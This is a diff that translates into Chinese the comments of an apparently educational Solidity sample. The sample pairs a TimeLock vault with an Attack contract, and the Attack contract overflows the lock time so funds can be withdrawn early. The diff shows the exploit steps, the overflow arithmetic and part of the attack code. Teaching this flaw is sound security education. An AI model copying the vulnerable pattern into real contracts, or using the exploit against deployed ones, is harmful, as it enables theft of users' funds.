@@ -1,19 +1,17 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.7.6;
 
-// This contract is designed to act as a time vault.
-// User can deposit into this contract but cannot withdraw for atleast a week.
-// User can also extend the wait time beyond the 1 week waiting period.
+// 这个合约被设计成一个时间保险箱。
+// 用户可以向此合约存款，但至少需要等待一周后才能取款。
+// 用户也可以延长等待时间超过一周。
 
 /*
-1. Deploy TimeLock
-2. Deploy Attack with address of TimeLock
-3. Call Attack.attack sending 1 ether. You will immediately be able to
-   withdraw your ether.
+1. 部署TimeLock
+2. 部署Attack，将TimeLock的地址传递给Attack
+3. 调用Attack.attack发送1个以太币。您将立即能够取回您的以太币。
 
-What happened?
-Attack caused the TimeLock.lockTime to overflow and was able to withdraw
-before the 1 week waiting period.
+发生了什么？
+攻击导致TimeLock.lockTime溢出，并在一周等待期结束之前取款。
 */
 
 contract TimeLock {
@@ -53,11 +51,11 @@ contract Attack {
     function attack() public payable {
         timeLock.deposit{value: msg.value}();
         /*
-        if t = current lock time then we need to find x such that
+        如果t是当前锁定时间，则我们需要找到x，使得
         x + t = 2**256 = 0
-        so x = -t
+        所以x = -t
         2**256 = type(uint).max + 1
-        so x = type(uint).max + 1 - t
+        所以 x = type(uint).max + 1 - t
         */
         timeLock.increaseLockTime(
             type(uint).max + 1 - timeLock.lockTime(address(this))
